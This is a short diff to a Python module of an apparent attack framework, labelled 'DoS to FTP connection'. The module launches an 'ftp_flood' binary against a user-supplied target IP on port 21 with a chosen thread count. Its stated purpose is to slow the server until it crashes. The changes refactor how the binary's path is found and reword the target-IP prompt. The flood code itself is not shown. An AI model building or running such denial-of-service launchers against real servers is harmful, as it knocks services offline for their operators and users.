@@ -1,7 +1,9 @@
 import subprocess
 import os
 import smf
+
 from rootmap import ROOT
+from lib.roar.callbin.calling import call_bin
 
 MOD_INFO = {
     "Name": "DoS to FTP connection",
@@ -16,7 +18,7 @@ and make the server slow until it crashes.
     "DefaultAction": "DoS",
     "License": "SMF License",
 }
-REQUIRED_OPTIONS = {"IP": "", "THREAD": "example: 1000"}
+REQUIRED_OPTIONS = {"IP": "Fill in with target IP", "THREAD": "example: 1000"}
 
 
 def execute(options):
@@ -24,9 +26,7 @@ def execute(options):
     port = "21"
     threads = options.get("THREAD")
 
-    bindir = os.path.join(ROOT, "external", "source", "out")
-    out_bin = os.path.join(bindir, "module", "aux", "dos", "ftp")
-    bin_path = os.path.join(out_bin, "ftp_flood")
+    bin_path = call_bin("ftp_flood")
 
     if not target:
         smf.printf("[-] ERROR: TARGET is missing!")
